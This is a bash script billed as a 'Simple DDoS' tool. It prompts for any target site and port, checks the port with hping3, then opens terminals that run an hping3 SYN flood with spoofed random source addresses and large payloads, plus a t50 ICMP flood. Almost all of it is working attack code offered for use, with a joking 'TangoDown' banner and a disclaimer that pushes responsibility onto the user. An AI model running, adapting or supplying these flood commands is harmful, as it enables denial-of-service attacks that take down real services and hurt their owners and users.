#!/bin/bash
#
# before usege this script, install:
# sudo apt-get install -y hping3 t50 lolcat && gem install lolcat
# - yeh~ i know i am just Script Kiddies
#
#
# what you do, it's your RESPONSIBILITY

name=$(uname -n)
YELLOW=$(tput setaf 3)
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
BLUE=$(tput setaf 4)
GGG=$(tput setaf 5)
CYN=$(tput setaf 7)
STAND=$(tput sgr 0)
BOLD=$(tput bold)
pwd=$(pwd)

if [[ $EUID -ne 0 ]]; then
    echo -e "run script with$BOLD$RED ROOT$STAND. exp:$BOLD$RED sudo bash$STAND <script>"
#    echo -e "$BOLD$RED\aSUDO$STAND <script>"
    exit 1
fi

#clear
echo -e " 
  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
  ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░
  ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░
  ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░
  ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░
  ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░
  ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░
  ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░
  ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░
  ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░
  ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░
  ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░
  ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░
  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
       ▖   ▖▖  ▖   ▄▖      ▄   ▄▖  ▄▖
       ▌   ▌▌  ▌   ▗▘      ▌▌  ▌▌  ▚ 
       ▙▖  ▙▌  ▙▖  ▙▖      ▙▘  ▙▌  ▄▌" | lolcat -p 0.7
echo " "
echo -e "$BLUE Simple DDoS "
echo ""
echo -e "$STAND$BOLD hallo $name, you know what this time for~.. TangoDown! $STAND"
echo ""

echo -e " Enter your site target  : \c"
read target
echo -e " Enter your target port  : \c"
read port
echo ""
for target1 in `ping $target -c 1 | grep PING | cut -d '(' -f 2 | cut -d ')' -f 1`
do
    if [ $target1 = $target1 ];then
        #for port1 in `hping3 --scan $port -S $target1 | grep http | cut -d 'h' -f 1` --fix for scan open port
        for port1 in `hping3 --scan $port -S $target1 | grep '.S.' | grep ':' | cut -d ':' -f 1 | cut -d ' ' -f 2,4`
        do
        if [ $port1 = $port1 ];then
            echo ""
            echo " Looding target.. $target1:$port"
            echo -e " hallo $name,"
            echo " $target$GREEN UP$STAND and port $port is$GREEN OPEN$STAND"
            echo ""
            echo " PowerFull DOS (TCP + Ping), so is Full(105%)$RED OverLoaded your CPU proseser!$STAND"
            echo -e " Clack 'Enter' to Attack.. \c"
            read attack
            sleep 3
            echo ""
            echo " proses 1 load.."
            sleep 3
            gnome-terminal --window --geometry=80x30 -x sh -c "echo 'click Ctrl+C for cancel Attack';echo '\n ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░\n ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░\n ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░\n ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░\n ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░\n ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░\n ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░\n ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░\n ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░\n ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░\n ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░\n ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░\n ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░' | lolcat ;echo ' you know what this time for~.. TangoDown!\n';hping3 --flood --rand-source --data 63000 --destport $port --syn $target1" &
            echo " proses 2 load.."
            sleep 2
            gnome-terminal --window --geometry=80x30 -x sh -c "echo 'click Ctrl+C for cancel Attack';echo '\n ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░\n ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░\n ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░\n ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░\n ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░\n ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░\n ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░\n ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░\n ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░\n ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░\n ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░\n ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░\n ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░' | lolcat;echo ' you know what this time for~.. TangoDown!\n';t50 --turbo --flood --protocol ICMP  $target1" &
            sleep 3
            echo ""
            echo " DONE!"
            exit
        fi
        done
    echo ""
    echo -e " hallo $name,"
    echo " $target$GREEN UP$STAND but port $port is$RED CLOSED!$STAND"
    echo ""
    exit
    fi
done
echo ""
echo -e " hallo $name,"
echo " error Target. $target is$RED DOWN!$STAND"
echo ""
